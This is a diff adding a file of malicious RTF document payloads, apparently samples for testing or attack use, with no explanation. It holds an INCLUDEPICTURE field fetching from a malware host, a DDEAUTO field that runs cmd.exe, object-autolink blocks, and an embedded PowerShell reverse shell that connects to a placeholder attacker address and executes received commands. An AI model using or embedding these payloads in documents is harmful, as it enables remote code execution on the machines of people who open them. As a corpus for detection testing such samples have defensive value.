@@ -1,0 +1,26 @@
+{\rtf1
+{\field{*\fldinst{INCLUDEPICTURE "http://www.malware.com/malware.jpg" }}{\fldrslt}}
+}
+
+{\rtf1\ansi\deff0
+{\fonttbl {\f0 Times New Roman;}}
+{\colortbl;\red0\green0\blue0;}
+\viewkind4\uc1\pard\cf1\f0\fs20 {\object\objautlink{\*\objdata{\rtf
+{\field{\*\fldinst{HYPERLINK "http://www.google.com"}}{\fldrslt{\ul\cf1\ulc1 Click Here}}}}}}
+}
+
+{\rtf1\ansi\ansicpg1252\deff0\nouicompat\deflang1033{\fonttbl{\f0\fnil\fcharset0 Calibri;}}
+{\colortbl ;\red0\green0\blue0;}
+{\*\generator Riched20 10.0.18362}\viewkind4\uc1
+DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"
+\\f0\\fs24\\par}\
+
+{\rtf1\ansi\deff0{\object\objautlink\objupdate\objw128\objh128\objdata "powershell.exe -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command "$client = New-Object System.Net.Sockets.TCPClient('attackerIP',attackerPort);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()”}}\
+
+
+{\rtf1\ansi\deff0
+{\fonttbl {\f0 Times New Roman;}}
+{\colortbl;\red0\green0\blue0;}
+\viewkind4\uc1\pard\cf1\f0\fs20 {\object\objautlink{\*\objdata{\rtf
+{\field{\*\fldinst{HYPERLINK "http://www.google.com"}}{\fldrslt{\ul\cf1\ulc1 Click Here}}}}}}
+}
